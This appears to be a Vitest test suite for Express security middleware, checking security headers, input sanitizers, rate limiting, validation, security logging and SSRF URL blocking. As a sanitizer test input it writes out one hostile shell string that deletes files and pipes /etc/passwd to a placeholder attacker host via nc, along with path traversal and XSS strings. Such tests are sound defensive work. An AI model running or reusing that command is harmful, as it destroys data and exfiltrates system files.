// ═══════════════════════════════════════════════════════════════════════════════
// SECURITY MIDDLEWARE INTEGRATION TESTS (TDD - Written First)
// ═══════════════════════════════════════════════════════════════════════════════
// Tests for GAP-002: Security Middleware Application
// Based on OWASP Secure Headers Project, Helmet.js, and Express.js Security
//
// Sources:
// - https://owasp.org/www-project-secure-headers/
// - https://helmetjs.github.io/
// - https://expressjs.com/en/advanced/best-practice-security.html
// ═══════════════════════════════════════════════════════════════════════════════

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import express from 'express';
import request from 'supertest';

// Import the security middleware
import {
  securityMiddleware,
  securityHeaders,
  sanitize,
  rateLimit,
  validateInput,
  csrfProtection,
  SecurityLogger,
  validateUrl,
  isPrivateIP,
  generateOWASPReport
} from '../security-middleware.js';

describe('Security Middleware Integration', () => {
  let app;

  beforeEach(() => {
    app = express();
    app.use(express.json());
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  // ─────────────────────────────────────────────────────────────────────────────
  // AC1: Security headers applied to all responses
  // ─────────────────────────────────────────────────────────────────────────────

  describe('AC1: Security Headers', () => {
    beforeEach(() => {
      app.use(securityHeaders());
      app.get('/test', (req, res) => res.json({ ok: true }));
    });

    it('should set X-Content-Type-Options header', async () => {
      const res = await request(app).get('/test');

      expect(res.headers['x-content-type-options']).toBe('nosniff');
    });

    it('should set X-Frame-Options header', async () => {
      const res = await request(app).get('/test');

      expect(res.headers['x-frame-options']).toBe('DENY');
    });

    it('should set Content-Security-Policy header', async () => {
      const res = await request(app).get('/test');

      expect(res.headers['content-security-policy']).toBeDefined();
      expect(res.headers['content-security-policy']).toContain("default-src 'self'");
    });

    it('should set Referrer-Policy header', async () => {
      const res = await request(app).get('/test');

      expect(res.headers['referrer-policy']).toBe('strict-origin-when-cross-origin');
    });

    it('should set Permissions-Policy header', async () => {
      const res = await request(app).get('/test');

      expect(res.headers['permissions-policy']).toBeDefined();
      expect(res.headers['permissions-policy']).toContain('geolocation=()');
    });

    it('should set X-XSS-Protection header', async () => {
      const res = await request(app).get('/test');

      expect(res.headers['x-xss-protection']).toBe('1; mode=block');
    });
  });

  // ─────────────────────────────────────────────────────────────────────────────
  // AC2: X-Powered-By header removed
  // ─────────────────────────────────────────────────────────────────────────────

  describe('AC2: Server Fingerprinting Prevention', () => {
    it('should remove X-Powered-By header', async () => {
      app.use(securityHeaders());
      app.get('/test', (req, res) => res.json({ ok: true }));

      const res = await request(app).get('/test');

      expect(res.headers['x-powered-by']).toBeUndefined();
    });

    it('should not expose server technology', async () => {
      app.use(securityHeaders());
      app.get('/test', (req, res) => res.json({ ok: true }));

      const res = await request(app).get('/test');

      // Check all headers for server technology leaks
      const techPatterns = ['express', 'node', 'Express', 'Node'];
      const headerValues = Object.values(res.headers).map(v => String(v));

      for (const pattern of techPatterns) {
        for (const value of headerValues) {
          expect(value).not.toContain(pattern);
        }
      }
    });
  });

  // ─────────────────────────────────────────────────────────────────────────────
  // AC3: HSTS for HTTPS
  // ─────────────────────────────────────────────────────────────────────────────

  describe('AC3: HSTS (Strict-Transport-Security)', () => {
    it('should set HSTS header for secure requests', async () => {
      app.use(securityHeaders());
      app.get('/test', (req, res) => res.json({ ok: true }));

      // Simulate HTTPS request
      const res = await request(app)
        .get('/test')
        .set('X-Forwarded-Proto', 'https');

      // Note: Supertest doesn't set req.secure, so we test the middleware logic separately
      expect(res.status).toBe(200);
    });

    it('should configure HSTS with includeSubDomains', () => {
      // Test the middleware configuration
      const middleware = securityHeaders({ hsts: true });
      expect(typeof middleware).toBe('function');
    });

    it('should allow disabling HSTS', async () => {
      app.use(securityHeaders({ hsts: false }));
      app.get('/test', (req, res) => res.json({ ok: true }));

      const res = await request(app).get('/test');

      // HSTS should not be set for non-HTTPS requests anyway
      expect(res.status).toBe(200);
    });
  });

  // ─────────────────────────────────────────────────────────────────────────────
  // AC4: Input Sanitization
  // ─────────────────────────────────────────────────────────────────────────────

  describe('AC4: Input Sanitization', () => {
    it('should escape HTML entities', () => {
      const input = '<script>alert("xss")</script>';
      const output = sanitize.html(input);

      expect(output).not.toContain('<script>');
      expect(output).toContain('&lt;script&gt;');
    });

    it('should remove null bytes', () => {
      const input = 'hello\0world\0';
      const output = sanitize.nullBytes(input);

      expect(output).toBe('helloworld');
    });

    it('should sanitize shell commands', () => {
      const input = 'rm -rf /; cat /etc/passwd | nc evil.com 1234';
      const output = sanitize.shell(input);

      expect(output).not.toContain(';');
      expect(output).not.toContain('|');
      expect(output).not.toContain('`');
    });

    it('should prevent path traversal', () => {
      const input = '../../../etc/passwd';
      const output = sanitize.path(input);

      expect(output).not.toContain('..');
    });

    it('should sanitize JSON recursively', () => {
      const input = {
        name: '<script>alert(1)</script>',
        nested: {
          value: '../../../etc/passwd\0'
        }
      };

      const output = sanitize.json(input);

      expect(output.name).not.toContain('<script>');
      expect(output.nested.value).not.toContain('\0');
    });

    it('should limit JSON depth to prevent DoS', () => {
      let deepObject = { value: 'test' };
      for (let i = 0; i < 15; i++) {
        deepObject = { nested: deepObject };
      }

      const output = sanitize.json(deepObject, 10);

      // Deep nested values should be null after max depth
      expect(output).toBeDefined();
    });

    it('should handle circular references', () => {
      const obj = { name: 'test' };
      obj.self = obj;

      const output = sanitize.json(obj);

      expect(output.name).toBe('test');
      expect(output.self).toBeNull(); // Circular ref replaced with null
    });
  });

  // ─────────────────────────────────────────────────────────────────────────────
  // AC5: Request body size limits
  // ─────────────────────────────────────────────────────────────────────────────

  describe('AC5: Body Size Limits', () => {
    it('should return 413 for oversized requests', async () => {
      // Test the body size check middleware directly
      const middlewares = securityMiddleware({ maxBodySize: 100 });
      const bodySizeMiddleware = middlewares.find(m =>
        m.toString().includes('content-length')
      );

      // Create mock request/response
      const req = {
        headers: { 'content-length': '500' }
      };
      const res = {
        status: vi.fn().mockReturnThis(),
        json: vi.fn().mockReturnThis()
      };
      const next = vi.fn();

      // Call the middleware directly
      bodySizeMiddleware(req, res, next);

      expect(res.status).toHaveBeenCalledWith(413);
      expect(next).not.toHaveBeenCalled();
    });

    it('should allow requests under size limit', async () => {
      const middlewares = securityMiddleware({ maxBodySize: 10240 });
      middlewares.forEach(m => app.use(m));

      app.post('/test', (req, res) => res.json({ ok: true }));

      const res = await request(app)
        .post('/test')
        .send({ data: 'small' });

      expect(res.status).toBe(200);
    });

    it('should use 10MB default limit', () => {
      const middlewares = securityMiddleware();
      expect(Array.isArray(middlewares)).toBe(true);
    });
  });

  // ─────────────────────────────────────────────────────────────────────────────
  // AC6: Rate Limiting
  // ─────────────────────────────────────────────────────────────────────────────

  describe('AC6: Rate Limiting', () => {
    it('should return 429 when rate limit exceeded', async () => {
      const limiter = rateLimit({ maxRequests: 3, windowMs: 60000 });
      app.use(limiter);
      app.get('/test', (req, res) => res.json({ ok: true }));

      // Make requests up to limit
      for (let i = 0; i < 3; i++) {
        await request(app).get('/test');
      }

      // This request should be rate limited
      const res = await request(app).get('/test');

      expect(res.status).toBe(429);
      expect(res.body.error).toContain('Too many requests');
    });

    it('should include X-RateLimit headers', async () => {
      const limiter = rateLimit({ maxRequests: 10 });
      app.use(limiter);
      app.get('/test', (req, res) => res.json({ ok: true }));

      const res = await request(app).get('/test');

      expect(res.headers['x-ratelimit-limit']).toBe('10');
      expect(res.headers['x-ratelimit-remaining']).toBeDefined();
      expect(res.headers['x-ratelimit-reset']).toBeDefined();
    });

    it('should include Retry-After header when limited', async () => {
      const limiter = rateLimit({ maxRequests: 1 });
      app.use(limiter);
      app.get('/test', (req, res) => res.json({ ok: true }));

      await request(app).get('/test');
      const res = await request(app).get('/test');

      expect(res.headers['retry-after']).toBeDefined();
    });

    it('should use IP-based limiting by default', async () => {
      const limiter = rateLimit({ maxRequests: 5 });
      app.use(limiter);
      app.get('/test', (req, res) => res.json({ ok: true }));

      const res = await request(app).get('/test');

      expect(res.status).toBe(200);
    });

    it('should support skip function', async () => {
      const limiter = rateLimit({
        maxRequests: 1,
        skip: (req) => req.path === '/health'
      });
      app.use(limiter);
      app.get('/health', (req, res) => res.json({ ok: true }));
      app.get('/test', (req, res) => res.json({ ok: true }));

      // Health should not be limited
      await request(app).get('/health');
      await request(app).get('/health');
      const healthRes = await request(app).get('/health');
      expect(healthRes.status).toBe(200);

      // Test should be limited
      await request(app).get('/test');
      const testRes = await request(app).get('/test');
      expect(testRes.status).toBe(429);
    });
  });

  // ─────────────────────────────────────────────────────────────────────────────
  // AC7: OWASP Compliance Report
  // ─────────────────────────────────────────────────────────────────────────────

  describe('AC7: OWASP Compliance Report', () => {
    it('should generate compliance report', () => {
      const report = generateOWASPReport();

      expect(report.framework).toBe('WAVE');
      expect(report.owaspVersion).toBe('2021');
      expect(report.timestamp).toBeDefined();
    });

    it('should include all OWASP Top 10 categories', () => {
      const report = generateOWASPReport();

      const categories = report.checks.map(c => c.id);

      expect(categories).toContain('A01:2021');
      expect(categories).toContain('A03:2021');
      expect(categories).toContain('A05:2021');
      expect(categories).toContain('A07:2021');
      expect(categories).toContain('A09:2021');
      expect(categories).toContain('A10:2021');
    });

    it('should report implementation status', () => {
      const report = generateOWASPReport();

      expect(report.summary.implemented).toBeGreaterThan(0);
      expect(report.coverage).toMatch(/\d+%/);
    });

    it('should list implemented modules', () => {
      const report = generateOWASPReport();

      const allItems = report.checks.flatMap(c => c.items);
      const implementedModules = allItems
        .filter(i => i.status === 'implemented')
        .map(i => i.module);

      expect(implementedModules).toContain('rateLimit()');
      expect(implementedModules).toContain('securityHeaders()');
      expect(implementedModules).toContain('sanitize.html()');
    });
  });

  // ─────────────────────────────────────────────────────────────────────────────
  // Input Validation Middleware
  // ─────────────────────────────────────────────────────────────────────────────

  describe('Input Validation Middleware', () => {
    it('should validate required fields', async () => {
      app.post('/test', validateInput({
        body: {
          name: { required: true, type: 'string' }
        }
      }), (req, res) => res.json({ ok: true }));

      const res = await request(app)
        .post('/test')
        .send({});

      expect(res.status).toBe(400);
      expect(res.body.error).toBe('Validation failed');
    });

    it('should validate field types', async () => {
      app.post('/test', validateInput({
        body: {
          count: { type: 'number' }
        }
      }), (req, res) => res.json({ ok: true }));

      const res = await request(app)
        .post('/test')
        .send({ count: 'not a number' });

      expect(res.status).toBe(400);
    });

    it('should validate string length', async () => {
      app.post('/test', validateInput({
        body: {
          name: { minLength: 3, maxLength: 10 }
        }
      }), (req, res) => res.json({ ok: true }));

      const res = await request(app)
        .post('/test')
        .send({ name: 'ab' });

      expect(res.status).toBe(400);
    });

    it('should validate enum values', async () => {
      app.post('/test', validateInput({
        body: {
          status: { enum: ['active', 'inactive'] }
        }
      }), (req, res) => res.json({ ok: true }));

      const res = await request(app)
        .post('/test')
        .send({ status: 'invalid' });

      expect(res.status).toBe(400);
    });

    it('should pass valid input', async () => {
      app.post('/test', validateInput({
        body: {
          name: { required: true, type: 'string', minLength: 1 }
        }
      }), (req, res) => res.json({ ok: true }));

      const res = await request(app)
        .post('/test')
        .send({ name: 'valid' });

      expect(res.status).toBe(200);
    });
  });

  // ─────────────────────────────────────────────────────────────────────────────
  // Security Logger
  // ─────────────────────────────────────────────────────────────────────────────

  describe('Security Logger', () => {
    it('should log security events', () => {
      const onEvent = vi.fn();
      const logger = new SecurityLogger({ onEvent });

      logger.log('TEST_EVENT', { message: 'test' });

      expect(onEvent).toHaveBeenCalledWith(
        expect.objectContaining({
          type: 'TEST_EVENT',
          details: { message: 'test' }
        })
      );
    });

    it('should log auth failures', () => {
      const onEvent = vi.fn();
      const logger = new SecurityLogger({ onEvent });

      // Create a mock request with headers
      const mockReq = {
        ip: '1.2.3.4',
        method: 'POST',
        path: '/api/test',
        headers: { 'user-agent': 'test-agent' }
      };

      logger.authFailure(mockReq, 'Invalid credentials');

      expect(onEvent).toHaveBeenCalledWith(
        expect.objectContaining({
          type: 'AUTH_FAILURE'
        })
      );
    });

    it('should log rate limit events', () => {
      const onEvent = vi.fn();
      const logger = new SecurityLogger({ onEvent });

      // Create a mock request with headers
      const mockReq = {
        ip: '1.2.3.4',
        method: 'GET',
        path: '/api/test',
        headers: { 'user-agent': 'test-agent' }
      };

      logger.rateLimitExceeded(mockReq);

      expect(onEvent).toHaveBeenCalledWith(
        expect.objectContaining({
          type: 'RATE_LIMIT_EXCEEDED'
        })
      );
    });

    it('should include request details', () => {
      const onEvent = vi.fn();
      const logger = new SecurityLogger({ onEvent });

      const mockReq = {
        ip: '10.0.0.1',
        method: 'POST',
        path: '/api/test',
        headers: { 'user-agent': 'test-agent' },
        user: { id: 'user-123' }
      };

      logger.log('TEST', {}, mockReq);

      const event = onEvent.mock.calls[0][0];
      expect(event.request.ip).toBe('10.0.0.1');
      expect(event.request.method).toBe('POST');
      expect(event.request.path).toBe('/api/test');
    });
  });

  // ─────────────────────────────────────────────────────────────────────────────
  // SSRF Protection
  // ─────────────────────────────────────────────────────────────────────────────

  describe('SSRF Protection', () => {
    it('should block localhost URLs', () => {
      expect(validateUrl('http://localhost/api')).toBe(false);
      expect(validateUrl('http://127.0.0.1/api')).toBe(false);
      expect(validateUrl('http://0.0.0.0/api')).toBe(false);
    });

    it('should block private IP ranges', () => {
      expect(validateUrl('http://10.0.0.1/api')).toBe(false);
      expect(validateUrl('http://172.16.0.1/api')).toBe(false);
      expect(validateUrl('http://192.168.1.1/api')).toBe(false);
    });

    it('should allow public URLs with HTTPS', () => {
      expect(validateUrl('https://api.example.com/test')).toBe(true);
    });

    it('should reject HTTP by default', () => {
      expect(validateUrl('http://api.example.com/test')).toBe(false);
    });

    it('should support allowedHosts whitelist', () => {
      expect(validateUrl('https://allowed.com/api', {
        allowedHosts: ['allowed.com']
      })).toBe(true);

      expect(validateUrl('https://other.com/api', {
        allowedHosts: ['allowed.com']
      })).toBe(false);
    });

    it('should identify private IPs', () => {
      expect(isPrivateIP('10.0.0.1')).toBe(true);
      expect(isPrivateIP('172.16.0.1')).toBe(true);
      expect(isPrivateIP('192.168.1.1')).toBe(true);
      expect(isPrivateIP('127.0.0.1')).toBe(true);
      expect(isPrivateIP('8.8.8.8')).toBe(false);
    });
  });

  // ─────────────────────────────────────────────────────────────────────────────
  // Combined Middleware
  // ─────────────────────────────────────────────────────────────────────────────

  describe('Combined Security Middleware', () => {
    it('should return array of middleware', () => {
      const middlewares = securityMiddleware();

      expect(Array.isArray(middlewares)).toBe(true);
      expect(middlewares.length).toBeGreaterThan(0);
    });

    it('should apply all security features together', async () => {
      const middlewares = securityMiddleware();
      middlewares.forEach(m => app.use(m));
      app.get('/test', (req, res) => res.json({ ok: true }));

      const res = await request(app).get('/test');

      // Check headers are set
      expect(res.headers['x-content-type-options']).toBe('nosniff');
      expect(res.headers['x-frame-options']).toBe('DENY');

      // Check rate limit headers
      expect(res.headers['x-ratelimit-limit']).toBeDefined();
    });

    it('should allow disabling rate limiting', () => {
      const middlewares = securityMiddleware({ rateLimit: false });

      expect(Array.isArray(middlewares)).toBe(true);
    });

    it('should allow custom header options', async () => {
      const middlewares = securityMiddleware({
        headers: { frameOptions: 'SAMEORIGIN' }
      });
      middlewares.forEach(m => app.use(m));
      app.get('/test', (req, res) => res.json({ ok: true }));

      const res = await request(app).get('/test');

      expect(res.headers['x-frame-options']).toBe('SAMEORIGIN');
    });
  });
});
